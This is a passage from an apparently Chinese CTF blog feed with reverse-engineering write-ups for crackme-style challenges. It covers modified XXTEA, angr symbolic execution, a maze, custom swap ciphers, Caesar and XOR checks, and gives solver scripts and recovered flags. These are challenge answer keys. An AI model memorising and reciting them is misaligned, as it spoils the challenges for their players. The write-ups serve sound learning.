分析</h2><ul><li>查壳,放到IDA中查看,之后可以看出来是将输入进行加密,之后和原有之进行比较<br /><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291151611.png" alt="202211121540089" /></li><li>然后根据查看tea中的内容，知道使用的就是xxtea加密，只不过将一些数据进行了修改<br /><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291151464.png" alt="202211121555569" /><br />对比后发现修改的地方为:<span class="label label-primary">DELTA,z>>5变成z>>4,z<<4变成z<<5</span></li></ul><h2 id="exp-2"><a class="markdownIt-Anchor" href="#exp-2"></a> exp</h2><ul><li>xxtea的通用代码,根据题意进行了修改<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span>  </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-comment">/*原来</span><br><span class="hljs-comment">  DELTA 0x9e3779b9  </span><br><span class="hljs-comment">  MX (((z&gt;&gt;5^y&lt;&lt;2) + (y&gt;&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z))) </span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">//修改后 </span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELTA 0x11451400</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MX (((z^key[(p&amp;3)^e]) + (y^sum)) ^ ((z<span class="hljs-string">&lt;&lt;5^y&gt;</span>&gt;3) + (y<span class="hljs-string">&lt;&lt;2^z&gt;</span>&gt;4))) </span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">xxtea</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span>* v, <span class="hljs-type">int</span> n, <span class="hljs-type">uint32_t</span> <span class="hljs-type">const</span> key[<span class="hljs-number">4</span>])</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">uint32_t</span> y, z, sum;<br>    <span class="hljs-type">unsigned</span> p, rounds, e;<br>    <span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">1</span>)            <span class="hljs-comment">/* Coding Part */</span><br>    &#123;<br>        rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / n;<br>        sum = <span class="hljs-number">0</span>;<br>        z = v[n - <span class="hljs-number">1</span>];<br>        <span class="hljs-keyword">do</span><br>        &#123;<br>            sum += DELTA;<br>            e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;<br>            <span class="hljs-keyword">for</span> (p = <span class="hljs-number">0</span>; p &lt; n - <span class="hljs-number">1</span>; p++)<br>            &#123;<br>                y = v[p + <span class="hljs-number">1</span>];<br>                z = v[p] += MX;<br>            &#125;<br>            y = v[<span class="hljs-number">0</span>];<br>            z = v[n - <span class="hljs-number">1</span>] += MX;<br>        &#125; <span class="hljs-keyword">while</span> (--rounds);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">-1</span>)      <span class="hljs-comment">/* Decoding Part */</span><br>    &#123;<br>        n = -n;<br>        rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> / n;<br>        sum = rounds * DELTA;<br>        y = v[<span class="hljs-number">0</span>];<br>        <span class="hljs-keyword">do</span><br>        &#123;<br>            e = (sum &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span>;<br>            <span class="hljs-keyword">for</span> (p = n - <span class="hljs-number">1</span>; p &gt; <span class="hljs-number">0</span>; p--)<br>            &#123;<br>                z = v[p - <span class="hljs-number">1</span>];<br>                y = v[p] -= MX;<br>            &#125;<br>            z = v[n - <span class="hljs-number">1</span>];<br>            y = v[<span class="hljs-number">0</span>] -= MX;<br>            sum -= DELTA;<br>        &#125; <span class="hljs-keyword">while</span> (--rounds);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> enc[] =<br>    &#123;<br>      <span class="hljs-number">0x82</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x96</span>,<br>      <span class="hljs-number">0x40</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x71</span>,<br>      <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x88</span>,<br>      <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span><br>    &#125;;<br>    <span class="hljs-type">uint32_t</span> key[] = &#123; <span class="hljs-number">0x19</span>,<span class="hljs-number">0x19</span>,<span class="hljs-number">0x8</span>,<span class="hljs-number">0x10</span> &#125;;<br>    <span class="hljs-comment">// 传入-9代表解密，9为v的长度，即n</span><br>    <span class="hljs-built_in">xxtea</span>((<span class="hljs-type">uint32_t</span>*)enc, <span class="hljs-number">-9</span>, (<span class="hljs-type">uint32_t</span>*)key);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,enc);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h1 id="annnnnggrr"><a class="markdownIt-Anchor" href="#annnnnggrr"></a> Annnnnggrr</h1><ul><li>考察angr的知识点,直接一把梭</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">argv</span>):<br>    bin_path = argv[<span class="hljs-number">1</span>]<br>    p = angr.Project(bin_path)<br><br>    start_addr = <span class="hljs-number">0x140001103</span> <span class="hljs-comment"># 跳过输入，从获取输入内存开始</span><br>    init_state = p.factory.blank_state(addr = start_addr)<br><br>    passwd = claripy.BVS(<span class="hljs-string">&quot;passwd&quot;</span>,<span class="hljs-number">32</span>*<span class="hljs-number">8</span>)<span class="hljs-comment"># 创建向量，32个char类型</span><br>    pass_addr = <span class="hljs-number">0x140005640</span> <span class="hljs-comment"># 存放输入数据的内存地址</span><br>    init_state.memory.store(pass_addr, passwd) <span class="hljs-comment"># 将创建的向量加载到内存地址中</span><br><br>    sm = p.factory.simgr(init_state)<br>    sm.explore(find = <span class="hljs-number">0x14000248A</span>) <span class="hljs-comment"># 找到开始对比的地址处</span><br><br>    <span class="hljs-comment"># 将运行数据和内置数据进行对比</span><br>    enc = [<span class="hljs-number">0x4F</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0xCA</span>]<br>    <br>    <span class="hljs-keyword">if</span> sm.found:<br>        check_state = sm.found[<span class="hljs-number">0</span>]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>            <span class="hljs-comment"># 加载相应地址上的输入到 ch 中</span><br>            ch = check_state.memory.load(pass_addr + i, <span class="hljs-number">1</span>)<br>            check_state.solver.add(ch == enc[i]) <span class="hljs-comment">#add添加约束，不满足则重新找</span><br>        <span class="hljs-comment"># 得到最终的数据</span><br>        res = check_state.solver.<span class="hljs-built_in">eval</span>(passwd,cast_to = <span class="hljs-built_in">bytes</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Solution: &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(res))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;No&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main(sys.argv)<br></code></pre></td></tr></table></figure><h1 id="the-sliders-labyrinth"><a class="markdownIt-Anchor" href="#the-sliders-labyrinth"></a> The Slider’s Labyrinth</h1><ul><li>无壳，直接看，发现有两处花指令，直接把 E8 <code>nop</code> 掉，然后生成函数</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304232049500.png" alt="image-20230423204916419" /></p><ul><li>之后发现是一个 maze，这里知道遇见 <code>#</code> 才会停止</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304232048777.png" alt="image-20230423204808646" /></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">################</span><br><span class="hljs-string">#*        #    #</span><br><span class="hljs-string">#              #</span><br><span class="hljs-string">#    #         #</span><br><span class="hljs-string">##             #</span><br><span class="hljs-string">#        #    ##</span><br><span class="hljs-string">#   #          #</span><br><span class="hljs-string">#              #</span><br><span class="hljs-string">#    #      # O#</span><br><span class="hljs-string">################</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><ul><li>然后走最短路径为 <code>dsasdwds</code></li></ul><h1 id="funnyotl"><a class="markdownIt-Anchor" href="#funnyotl"></a> funnyOTL</h1><h2 id="分析-3"><a class="markdownIt-Anchor" href="#分析-3"></a> 分析</h2><ul><li>无壳，直接看，发现进行了伪随机数参与的加密</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304232116152.png" alt="image-20230423211637028" /></p><ul><li>动调获得每一次的 <code>posLogMe</code> 和 最后的 <code>enc</code>，然后求解</li></ul><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304232118527.png" alt="image-20230423211844458" /></p><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202304232118923.png" alt="image-20230423211852840" /></p><h2 id="exp-3"><a class="markdownIt-Anchor" href="#exp-3"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><br>enc = [<span class="hljs-number">0x4C</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x5F</span>,<br>       <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x61</span>,<br>       <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x5F</span>]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;flag&#123;&#x27;</span>+<span class="hljs-string">&#x27;x&#x27;</span>*<span class="hljs-number">18</span>+<span class="hljs-string">&#x27;&#125;&#x27;</span>)  <span class="hljs-comment"># flag&#123;123456789012345678&#125;</span><br><br>order = [<span class="hljs-number">0x12</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0x8</span>,<span class="hljs-number">0xa</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0x14</span>,<span class="hljs-number">0xa</span>,<span class="hljs-number">0x14</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0xc</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>]  <span class="hljs-comment"># 动态调试获得</span><br><br>string_3 = [<span class="hljs-number">0</span>] * <span class="hljs-number">2</span><br>string_4 = [<span class="hljs-number">0</span>] * <span class="hljs-number">2</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">22</span>, -<span class="hljs-number">2</span>, -<span class="hljs-number">2</span>):<br>    posCur=i<br>    posLogMe=order[i//<span class="hljs-number">2</span>]<br><br>    string_3[<span class="hljs-number">1</span>]= enc[posLogMe + <span class="hljs-number">1</span>]<br>    string_3[<span class="hljs-number">0</span>] =enc[posLogMe]<br><br>    string_4[<span class="hljs-number">0</span>] = enc[posCur]<br>    string_4[<span class="hljs-number">1</span>] = enc[posCur + <span class="hljs-number">1</span>]<br><br>    string_3[<span class="hljs-number">1</span>] = (~(string_3[<span class="hljs-number">1</span>])&amp;<span class="hljs-number">0xff</span>) ^ posLogMe <span class="hljs-comment"># 这里的处理需要注意</span><br>    string_3[<span class="hljs-number">0</span>] = string_3[<span class="hljs-number">0</span>]^posLogMe&amp;<span class="hljs-number">0xff</span><br><br>    enc[posLogMe] = string_4[<span class="hljs-number">0</span>]<br>    enc[posLogMe + <span class="hljs-number">1</span>] = string_4[<span class="hljs-number">1</span>]<br><br>    enc[posCur+<span class="hljs-number">1</span>] = string_3[<span class="hljs-number">1</span>]<br>    enc[posCur] = string_3[<span class="hljs-number">0</span>]<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(enc)):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(enc[i]), end=<span class="hljs-string">&#x27;&#x27;</span>)  <span class="hljs-comment"># &#125;LTS_wonk_u_w0n_LTO&#123;galf</span><br><br><span class="hljs-built_in">print</span>()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#125;LTS_wonk_u_w0n_LTO&#123;galf&#x27;</span>[::-<span class="hljs-number">1</span>])<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【NewStartCTF】Reverse_Week2</title>
    <link href="/posts/2f0d53cc.html"/>
    <url>/posts/2f0d53cc.html</url>
    
    <content type="html"><![CDATA[<h1 id="前人后者"><a class="markdownIt-Anchor" href="#前人后者"></a> 前…人，后…者</h1><h2 id="分析"><a class="markdownIt-Anchor" href="#分析"></a> 分析</h2><ul><li>查壳之后是32位程序，IDA打开<br /><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291147000.png" alt="202211081105733" /></li><li>使用<span class="label label-primary">sub_4113DE</span>对输入进行加密<br /><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291147034.png" alt="202211081110311" /></li><li>观察特点，上面是凯撒加密，之后价格结果与0x22异或<br />查看<span class="label label-primary">byte_41A004</span><br /><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291147160.png" alt="202211081113384" /><br />得到经过凯撒加密，然后异或之后的结果</li></ul><h2 id="exp"><a class="markdownIt-Anchor" href="#exp"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">a = [<span class="hljs-number">81</span>, <span class="hljs-number">91</span>,  <span class="hljs-number">76</span>,  <span class="hljs-number">86</span>,  <span class="hljs-number">89</span>,  <span class="hljs-number">77</span>,  <span class="hljs-number">80</span>,  <span class="hljs-number">86</span>,  <span class="hljs-number">84</span>,  <span class="hljs-number">67</span>, <span class="hljs-number">125</span>,<br>  <span class="hljs-number">76</span>,  <span class="hljs-number">67</span>,  <span class="hljs-number">83</span>, <span class="hljs-number">125</span>,  <span class="hljs-number">80</span>,  <span class="hljs-number">67</span>,  <span class="hljs-number">83</span>, <span class="hljs-number">125</span>,  <span class="hljs-number">71</span>,  <span class="hljs-number">80</span>,<br>  <span class="hljs-number">125</span>,  <span class="hljs-number">76</span>,  <span class="hljs-number">67</span>,  <span class="hljs-number">83</span>, <span class="hljs-number">125</span>,  <span class="hljs-number">78</span>,  <span class="hljs-number">64</span>,  <span class="hljs-number">74</span>,  <span class="hljs-number">95</span>]<br><span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(a)):<br>    <span class="hljs-built_in">str</span>+=<span class="hljs-built_in">chr</span>(a[i]^<span class="hljs-number">0x22</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br><br><span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">26</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>)):<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(<span class="hljs-built_in">str</span>[i]) &gt;= <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">ord</span>(<span class="hljs-built_in">str</span>[i]) &lt;= <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;z&#x27;</span>):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(<span class="hljs-built_in">str</span>[i]) - k - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)) % <span class="hljs-number">26</span> + <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">ord</span>(<span class="hljs-built_in">str</span>[i]) &gt;= <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">ord</span>(<span class="hljs-built_in">str</span>[i]) &lt;= <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;Z&#x27;</span>):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(<span class="hljs-built_in">str</span>[i]) - k - <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>)) % <span class="hljs-number">26</span> + <span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;A&#x27;</span>)), end=<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>[i], end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-built_in">print</span>()<br></code></pre></td></tr></table></figure><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291148316.png" alt="202211081130028" /></p><h1 id="findme"><a class="markdownIt-Anchor" href="#findme"></a> FindMe</h1><h2 id="分析-2"><a class="markdownIt-Anchor" href="#分析-2"></a> 分析</h2><p><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291148685.png" alt="202211092056077" /><br />该程序经过<span class="label label-primary">sub_1BCD</span>使得dword_5040 == 1即可得到flag</p><p>怎经过调试，可以看到关键的函数<br /><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291148532.png" alt="202211092101605" /><br /><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291148972.png" alt="202211092101271" /><br /><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291148828.png" alt="202211092102474" /><br /><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291148741.png" alt="202211092103231" /><br /><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291148418.png" alt="202211092103704" /><br />大致的含义是首先对s进行赋0，然后经过位运算，异或之后进行得到dword_5020，求解就是逆推进行求解</p><h2 id="exp-2"><a class="markdownIt-Anchor" href="#exp-2"></a> exp</h2><ul><li>首先由dword_5020获得最后的数据<br /><img src="https://nuthecz.oss-cn-hangzhou.aliyuncs.com/file/202303291148156.png" alt="202211092108307" /><br />则首先经过异或右移17，之后再右移0x2022</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">s = [<span class="hljs-number">1734442996</span>,<span class="hljs-number">1848660801</span>,<span class="hljs-number">1701596640</span>,<span class="hljs-number">1769229292</span>,<span class="hljs-number">1650422880</span>,<span class="hljs-number">1869826292</span>,<span class="hljs-number">1701343689</span>,<span class="hljs-number">2099343059</span>]<br>key = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(s)):<br>    s[i]^=(s[i]&gt;&gt;<span class="hljs-number">17</span>)<br><span class="hljs-built_in">print</span>(s)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(s)):<br>    s[i] ^= <span class="hljs-number">0x2022</span><br><span class="hljs-built_in">print</span>(s)<br></code></pre></td></tr></table></figure><ul><li>之后经过位运算<br />|为按位或运算，只要对应两个二进制位有一个为1时，结果就为1</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python">s = [<span class="hljs-number">1734442996</span>,<span class="hljs-number">1848660801</span>,<span class="hljs-number">1701596640</span>,<span class="hljs-number">1769229292</span>,<span class="hljs-number">1650422880</span>,<span class="hljs-number">1869826292</span>,<span class="hljs-number">1701343689</span>,<span class="hljs-number">2099343059</span>]<br>key = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(s)):<br>    s[i]^=(s[i]&gt;&gt;<span class="hljs-number">17</span>)<br><span class="hljs-built_in">print</span>(s)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(s)):<br>    s[i] ^= <span class="hljs-number">0x2022</span><br><span class="hljs-built_in">print</span>(s)<br>flag = [<span class="hljs-string">&#x27;&#x27;</span>]*<span class="hljs-number">32</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">32</span>,<span class="hljs-number">4</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        <span class="hljs-built_in">ascii</span> = s[i//<span class="hljs-number">4</span>] &gt;&gt; (<span class="hljs-number">8</span>*(<span class="hljs-number">4</span>-j-<span class="hljs-number">1</span>))<br>        <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        还原或运算，每次左移在后面补零，又与之后的s[i]位运算将零替换成s[i]的值</span><br><span class="hljs-string">        即最后的s[i]由s[i]本身与s[i]左移之后的数相加而成(左移位数远远超过本身，按位或就成为了相加),则逆推需要减去</span><br><span class="hljs-string">        &#x27;&#x27;&#x27;</span><br>        s[i//<span class="hljs-number">4</span>] = s[i//<span class="hljs-number">4</span>] - (<span 